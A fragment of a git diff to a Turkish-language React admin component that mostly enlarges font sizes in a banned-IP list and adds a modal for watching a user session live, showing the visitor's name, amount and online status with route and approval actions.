+                      new Date(deviceInfoSession.updated_at).toLocaleString("tr-TR")
+                    ) : (
+                      "Bilinmiyor"
+                    )}
+                  </div>
+                </div>
               </div>
 
               <div className="grid grid-cols-2 gap-4">
@@ -3330,13 +3938,13 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 </div>
                 <div>
                   <h3 className={`text-lg font-black tracking-tight ${darkMode ? 'text-white' : 'text-gray-900'}`}>Banlanan IP Adresleri</h3>
-                  <p className={`text-[11px] opacity-70 mt-0.5 ${darkMode ? 'text-zinc-400' : 'text-gray-500'}`}>Toplam {bannedList.length} adet engellenmiş IP • İstediğini kaldırabilirsin</p>
+                  <p className={`text-[13px] opacity-70 mt-0.5 ${darkMode ? 'text-zinc-400' : 'text-gray-500'}`}>Toplam {bannedList.length} adet engellenmiş IP • İstediğini kaldırabilirsin</p>
                 </div>
               </div>
               <div className="flex items-center gap-2">
                 <button
                   onClick={() => void loadBannedList()}
-                  className={`flex items-center gap-1.5 rounded-full px-3.5 py-1.5 text-[10px] font-bold uppercase tracking-wider transition-all hover:scale-105 ${darkMode ? 'bg-white/5 border border-white/10 text-gray-300 hover:text-white hover:bg-white/10' : 'bg-gray-50 border border-gray-200 text-gray-600 hover:bg-gray-100 hover:text-black'}`}
+                  className={`flex items-center gap-1.5 rounded-full px-3.5 py-1.5 text-[12px] font-bold uppercase tracking-wider transition-all hover:scale-105 ${darkMode ? 'bg-white/5 border border-white/10 text-gray-300 hover:text-white hover:bg-white/10' : 'bg-gray-50 border border-gray-200 text-gray-600 hover:bg-gray-100 hover:text-black'}`}
                   title="Listeyi yenile"
                 >
                   <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" /></svg>
@@ -3363,7 +3971,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 <div className={`p-12 text-center rounded-none border-t-0 border-x-0 border-b-0 border-2 border-dashed m-4 rounded-3xl ${darkMode ? 'border-white/10 text-zinc-500' : 'border-gray-200 text-gray-400'}`}>
                   <svg className="w-12 h-12 mx-auto mb-3 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
                   <p className="text-[13px] font-black uppercase tracking-wider mb-1">Henüz banlanmış IP yok</p>
-                  <p className="text-[11px] opacity-70">Sistemden IP engellediğinizde kayıtlar burada listelenecek</p>
+                  <p className="text-[13px] opacity-70">Sistemden IP engellediğinizde kayıtlar burada listelenecek</p>
                 </div>
               )}
 
@@ -3380,18 +3988,18 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                           <span className={`font-mono font-black text-[15px] tracking-wider ${darkMode ? 'text-red-400' : 'text-red-600'}`}>
                             {ban.ip_address || "IP bilgisi yok"}
                           </span>
-                          <span className={`inline-flex items-center rounded-full px-2 py-0.5 text-[9px] font-black uppercase tracking-wider whitespace-nowrap ${darkMode ? 'bg-red-500/10 text-red-400 border border-red-500/20' : 'bg-red-50 text-red-600 border border-red-100'}`}>
+                          <span className={`inline-flex items-center rounded-full px-2 py-0.5 text-[11px] font-black uppercase tracking-wider whitespace-nowrap ${darkMode ? 'bg-red-500/10 text-red-400 border border-red-500/20' : 'bg-red-50 text-red-600 border border-red-100'}`}>
                             🔒 Engelli
                           </span>
                         </div>
                         {ban.reason && (
-                          <div className={`text-[11px] opacity-80 leading-snug whitespace-normal break-words ${darkMode ? 'text-zinc-400' : 'text-gray-600'}`}>
+                          <div className={`text-[13px] opacity-80 leading-snug whitespace-normal break-words ${darkMode ? 'text-zinc-400' : 'text-gray-600'}`}>
                             <span className="font-bold uppercase tracking-wider opacity-70 mr-1">Neden:</span>
                             {ban.reason}
                           </div>
                         )}
                         {(ban.banned_at || ban.created_at) && (
-                          <div className={`text-[10px] opacity-60 font-mono mt-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
+                          <div className={`text-[12px] opacity-60 font-mono mt-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
                             📅 {new Date(ban.banned_at || ban.created_at).toLocaleString('tr-TR')}
                           </div>
                         )}
@@ -3400,7 +4008,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       {/* UNBAN BUTONU */}
                       <button
                         onClick={() => void handleUnban(ban.ip_address)}
-                        className="shrink-0 flex items-center gap-1.5 rounded-xl px-4 py-2 text-[11px] font-black uppercase tracking-wider transition-all hover:scale-105 active:scale-95 bg-green-500/10 text-green-600 dark:text-green-400 hover:bg-green-500 hover:text-white border border-green-500/20"
+                        className="shrink-0 flex items-center gap-1.5 rounded-xl px-4 py-2 text-[13px] font-black uppercase tracking-wider transition-all hover:scale-105 active:scale-95 bg-green-500/10 text-green-600 dark:text-green-400 hover:bg-green-500 hover:text-white border border-green-500/20"
                         title="Bu IP yasağını kaldır"
                       >
                         <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" /></svg>
@@ -3423,6 +4031,28 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
             </div>
           </div>
         </div>
+      )}
+
+      {/* LIVE WATCH MODAL */}
+      {liveWatchRow && (
+        <LiveWatchModal
+          sessionId={liveWatchRow.id}
+          publicId={liveWatchRow.public_id}
+          initialName={`${(liveWatchRow.form_data as any)?.firstName || ""} ${(liveWatchRow.form_data as any)?.lastName || ""}`.trim()}
+          initialAmount={liveWatchRow.amount}
+          initialPath={sessionPaths[liveWatchRow.id]}
+          formData={(liveWatchRow.form_data as any) || {}}
+          isOnline={isSessionLive(
+            liveWatchRow.id,
+            onlineSessionIds,
+            liveWatchRow.status,
+            sessionLastSeenAt[liveWatchRow.id]
+          )}
+          darkMode={darkMode}
+          onRouteAction={(action) => void handleRouteAction(liveWatchRow.id, action)}
+          onApprovalAction={(approval) => void handleApprovalAction(liveWatchRow.id, approval)}
+          onClose={() => setLiveWatchRow(null)}
+        />
       )}
     </div>
   );
